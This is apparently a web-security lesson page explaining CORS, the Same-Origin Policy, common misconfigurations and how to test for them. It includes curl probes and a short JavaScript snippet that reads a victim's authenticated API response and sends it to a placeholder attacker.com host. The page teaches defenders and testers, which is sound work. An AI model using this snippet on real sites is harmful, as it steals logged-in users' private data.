---
title: "CORS (Cross-Origin Resource Sharing)"
topic: "cors"
tags: [cors, web-security, same-origin-policy, http-headers, javascript]
difficulty: intermediate
day: 22
layout: default
parent: Topics
nav_order: 22
---

# CORS (Cross-Origin Resource Sharing)

## What You Will Learn
- What the Same-Origin Policy (SOP) is and why it exists
- What CORS is and how it relaxes the SOP
- How misconfigured CORS leads to cross-origin data theft
- How to test for CORS vulnerabilities

## What Is It?

**CORS (Cross-Origin Resource Sharing)** is an HTTP header-based mechanism that allows a server to indicate which origins (domains, schemes, or ports) other than its own are permitted to load resources from it.

CORS is a controlled relaxation of the **Same-Origin Policy (SOP)** — a browser security rule that prevents a web page from making requests to a different origin (domain, protocol, or port) than the one that served it.

## Why It Matters

A misconfigured CORS policy can allow an attacker's website to make authenticated requests to a victim web application on behalf of a logged-in user and read the response. This can expose sensitive user data, session tokens, and private API responses.

## Key Concepts

### Same-Origin Policy (SOP)

The Same-Origin Policy is a browser rule that blocks cross-origin reads by default. Two URLs have the same origin if they have the same **protocol + domain + port**.

| URL | Same origin as `https://example.com`? |
|-----|---------------------------------------|
| `https://example.com/page` | Yes |
| `http://example.com` | No (different protocol) |
| `https://sub.example.com` | No (different subdomain) |
| `https://example.com:8080` | No (different port) |

Without SOP, a malicious site could read your bank balance while you're logged in.

### CORS Headers

**Request header (sent by browser):**
```
Origin: https://attacker.com
```

**Response headers (sent by server):**
```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

If a server responds with `Access-Control-Allow-Origin: *` (wildcard), any origin can read the response — but credentials (cookies) cannot be included with a wildcard.

The dangerous combination is:
```
Access-Control-Allow-Origin: https://attacker.com  (reflects attacker's origin)
Access-Control-Allow-Credentials: true
```

This allows an attacker's site to make credentialed requests and read private responses.

## Hands-On

### Testing for CORS Misconfiguration

```bash
# Probe whether the server reflects the Origin header
curl -H "Origin: https://attacker.com" -I https://target.com/api/user
```

Look for:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

### Exploiting CORS to Steal Data

If a server reflects any origin with credentials allowed, an attacker can host this JavaScript on their site to steal data:

```html
<script>
fetch('https://vulnerable.com/api/user', {
  credentials: 'include'  // sends cookies
})
.then(response => response.json())
.then(data => {
  // Exfiltrate the data to the attacker's server
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

### Common Misconfigurations to Test

1. **Reflects any origin**: Server echoes back `Origin` header in `Access-Control-Allow-Origin`.
2. **Null origin**: Server allows `Origin: null` (triggered from sandboxed iframes).
3. **Prefix/suffix matching only**: Server allows `https://example.com.attacker.com` because it only checks if the value starts with `https://example.com`.

```bash
# Test null origin
curl -H "Origin: null" https://target.com/api/sensitive
```

### Secure CORS Configuration

```
Access-Control-Allow-Origin: https://trusted-partner.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

Only whitelist origins you explicitly trust. Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` — this combination is not permitted by browsers, but reflecting attacker origins is equally dangerous.

## Resources

- [PortSwigger — CORS Vulnerabilities](https://portswigger.net/web-security/cors)
- [MDN — Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP — CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [TryHackMe — CORS Room](https://tryhackme.com/room/corsmisconfig)
